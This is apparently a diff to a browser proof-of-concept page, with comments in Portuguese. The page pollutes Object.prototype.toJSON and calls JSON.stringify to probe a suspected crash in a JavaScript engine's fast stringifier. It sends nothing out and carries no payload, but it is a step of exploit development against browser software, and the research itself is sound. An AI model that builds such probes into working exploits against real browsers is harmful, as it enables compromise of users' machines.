@@ -2,12 +2,13 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>PoC Isolado v2.3p - Teste toJSON Primitivo</title>
+    <title>PoC Isolado v2.3q - Foco Object.keys no Raiz</title>
     <style> /* ... estilos como antes ... */ </style>
 </head>
 <body>
-    <h1>PoC Isolado v2.3p - Testando com toJSON Retornando Primitivo</h1>
-    <button onclick="runTest_v23p()">Iniciar Teste v2.3p</button>
+    <h1>PoC Isolado v2.3q - Foco em Object.keys() no Objeto Raiz</h1>
+    <p>toJSON poluído só chama Object.keys(this) se 'this' for o objeto raiz.</p>
+    <button onclick="runTest_v23q()">Iniciar Teste v2.3q</button>
     <div id="output"></div>
 
     <script>
@@ -27,64 +28,98 @@
         };
         const PAUSE_S1_FUNC = (ms = 50) => new Promise(r => setTimeout(r, ms));
         
-        const testObject_p = { root_prop1_p: "val1_p", root_prop2_p: "val2_p" };
-        let callCount_toJSON_p = 0;
-        let originalToJSON_Descriptor_p;
-        const ppKey_p = 'toJSON';
+        const testObject_q = { propA: "valueA", propB: "valueB" }; // Objeto de teste SEM aninhamento
+        let callCount_toJSON_q = 0;
+        let originalToJSON_Descriptor_q;
+        const ppKey_q = 'toJSON';
 
-        function setupPrototypePollution_p() {
-            callCount_toJSON_p = 0;
-            originalToJSON_Descriptor_p = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_p);
+        function setupPrototypePollution_q() {
+            callCount_toJSON_q = 0;
+            originalToJSON_Descriptor_q = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_q);
 
-            Object.prototype[ppKey_p] = function() { 
-                callCount_toJSON_p++;
-                let logPrefix = `toJSON PoC v2.3p (Call ${callCount_toJSON_p})`;
+            Object.prototype[ppKey_q] = function() { 
+                callCount_toJSON_q++;
+                let logPrefix = `toJSON PoC v2.3q (Call ${callCount_toJSON_q})`;
                 
-                let thisIdentifier = "unknown_this_p";
-                if (this === testObject_p) thisIdentifier = "ROOT_OBJECT_P";
-                // Não esperamos recursão aqui, pois retornaremos um primitivo.
+                let thisIdentifier = "unknown_this_q";
+                if (this === testObject_q) thisIdentifier = "ROOT_OBJECT_Q";
+                else if (Array.isArray(this)) thisIdentifier = "ARRAY_OBJECT_Q";
+                 else if (this && typeof this === 'object' && this.hasOwnProperty('processed_type_q')) {
+                    thisIdentifier = `RETURNED_OBJ_TYPE_${this.processed_type_q}_Q`;
+                }
 
-                console.log(`%c${logPrefix} - Invocado! id='${thisIdentifier}', typeof='${typeof this}', constructor='${this && this.constructor ? this.constructor.name : 'N/A'}'`, "color:darkcyan");
-                logS1(`${logPrefix} - Invocado! id='${thisIdentifier}', typeof='${typeof this}', constructor='${this && this.constructor ? this.constructor.name : 'N/A'}'`, 'critical', 'toJSON_p');
-                
-                // RETORNA UM PRIMITIVO SIMPLES
-                return "toJSON_was_here_primitive_return"; 
+                console.log(`%c${logPrefix} - Invocado! id='${thisIdentifier}', typeof='${typeof this}', constructor='${this && this.constructor ? this.constructor.name : 'N/A'}'`, "color:darkviolet");
+                logS1(`${logPrefix} - Invocado! id='${thisIdentifier}', typeof='${typeof this}', constructor='${this && this.constructor ? this.constructor.name : 'N/A'}'`, 'critical', 'toJSON_q');
+
+                if (this === testObject_q) { // Só executa Object.keys se 'this' for o objeto raiz
+                    console.log(`%c${logPrefix} - 'this' é ROOT_OBJECT_Q. PRESTES A CHAMAR Object.keys(this)! Inspecione 'this' abaixo:`, "color:red; font-weight:bold;");
+                    console.log("%cConteúdo de 'this' (ROOT_OBJECT_Q):", "color:red;");
+                    console.dir(this); // Tenta logar o objeto interativamente
+                    logS1(`${logPrefix} - 'this' é ROOT_OBJECT_Q. TENTANDO Object.keys(this) AGORA (PONTO CRÍTICO!)...`, 'critical', 'toJSON_q');
+                    
+                    let keys = [];
+                    try {
+                        keys = Object.keys(this); 
+                        console.log(`%c${logPrefix} - Object.keys(this) SUCESSO para ROOT. Chaves:`, "color:green", keys);
+                        logS1(`${logPrefix} - Object.keys(this) SUCESSO para ROOT. Chaves: [${keys.join(',')}]`, 'good', 'toJSON_q');
+                        // Este é o tipo de retorno que suspeitamos causar o problema no FastStringifier
+                        return { 
+                            processed_type_q: "RootResultWithKeys",
+                            object_keys_q: keys 
+                        };
+                    } catch (e) {
+                        console.error(`${logPrefix} - ERRO em Object.keys(this) para ROOT_OBJECT_Q:`, e);
+                        logS1(`${logPrefix} - ERRO em Object.keys(this) para ROOT_OBJECT_Q: ${e.message}`, 'error', 'toJSON_q');
+                        return { "error_processing_root_q": true, "message": String(e.message) };
+                    }
+                } else {
+                    // Para QUALQUER OUTRO 'this' (incluindo o objeto retornado acima, ou um array, etc.)
+                    // retorna uma string simples para parar a recursão de Object.keys e isolar o teste.
+                    console.log(`%c${logPrefix} - 'this' é '${thisIdentifier}' (NÃO É O ROOT). Retornando string simples.`, "color:orange");
+                    logS1(`${logPrefix} - 'this' é '${thisIdentifier}' (NÃO É O ROOT). Retornando string simples.`, 'info', 'toJSON_q');
+                    return `processed_non_root_${thisIdentifier}_call_${callCount_toJSON_q}`; 
+                }
             };
-            logS1("Poluição Object.prototype.toJSON APLICADA (retorna string primitiva).", 'good', 'setup_p');
+            logS1("Poluição Object.prototype.toJSON APLICADA (v2.3q - Object.keys só no raiz).", 'good', 'setup_q');
         }
 
-        function cleanupPrototypePollution_p() {
-            if (originalToJSON_Descriptor_p) {
-                Object.defineProperty(Object.prototype, ppKey_p, originalToJSON_Descriptor_p);
-            } else if (Object.prototype.hasOwnProperty(ppKey_p)) {
-                delete Object.prototype[ppKey_p];
+        function cleanupPrototypePollution_q() {
+            if (originalToJSON_Descriptor_q) {
+                Object.defineProperty(Object.prototype, ppKey_q, originalToJSON_Descriptor_q);
+            } else if (Object.prototype.hasOwnProperty(ppKey_q)) {
+                delete Object.prototype[ppKey_q];
             }
-            logS1("Object.prototype.toJSON restaurado.", 'good', 'cleanup_p');
+            logS1("Object.prototype.toJSON restaurado.", 'good', 'cleanup_q');
         }
 
-        async function runTest_v23p() {
+        async function runTest_v23q() {
             document.querySelectorAll('button').forEach(b => b.disabled = true);
             if (outputDivS1) outputDivS1.innerHTML = '';
-            logS1(`==== INICIANDO PoC Isolado v2.3p (Teste toJSON Primitivo) ====`, 'test', 'runTest_p');
+            logS1(`==== INICIANDO PoC Isolado v2.3q (Foco Object.keys no Raiz) ====`, 'test', 'runTest_q');
 
-            setupPrototypePollution_p();
+            setupPrototypePollution_q();
             
-            logS1(`Tentando JSON.stringify em testObject_p...`, 'critical', 'runTest_p');
-            let result_p;
+            logS1(`Tentando JSON.stringify em testObject_q...`, 'critical', 'runTest_q');
+            let result_q;
             try {
-                await PAUSE_S1_FUNC(50); 
-                result_p = JSON.stringify(testObject_p);
-                logS1(`JSON.stringify CONCLUÍDO. Resultado: ${result_p ? String(result_p) : "N/A"}`, 'good', 'runTest_p');
+                // Adicionar uma pequena pausa ANTES de JSON.stringify pode dar chance aos logs de setup aparecerem
+                // se o crash for EXTREMAMENTE rápido na chamada.
+                await PAUSE_S1_FUNC(100); // Pausa um pouco mais longa
+                 
+                result_q = JSON.stringify(testObject_q); // Objeto de teste bem simples
+                
+                // Se chegar aqui, não travou como esperado no PoC v2.3 original
+                logS1(`JSON.stringify CONCLUÍDO. Resultado (parcial): ${result_q ? String(result_q).substring(0, 1000) : "N/A"}`, 'good', 'runTest_q');
             } catch (e) {
-                logS1(`ERRO CAPTURADO por JSON.stringify: ${e.message}`, 'error', 'runTest_p');
-                if (e.stack) logS1(`Stack: ${e.stack}`, 'error', 'runTest_p');
-                console.error("ERRO durante JSON.stringify em runTest_p:", e);
+                logS1(`ERRO CAPTURADO por JSON.stringify: ${e.message}`, 'error', 'runTest_q');
+                if (e.stack) logS1(`Stack: ${e.stack}`, 'error', 'runTest_q');
+                console.error("ERRO durante JSON.stringify em runTest_q:", e);
             } finally {
-                cleanupPrototypePollution_p();
+                cleanupPrototypePollution_q();
             }
             
             await PAUSE_S1_FUNC(MEDIUM_PAUSE_S1);
-            logS1(`\n==== PoC Isolado v2.3p CONCLUÍDO ====`, 'test', 'runTest_p');
+            logS1(`\n==== PoC Isolado v2.3q CONCLUÍDO ====`, 'test', 'runTest_q');
             document.querySelectorAll('button').forEach(b => b.disabled = false);
         }
     </script>
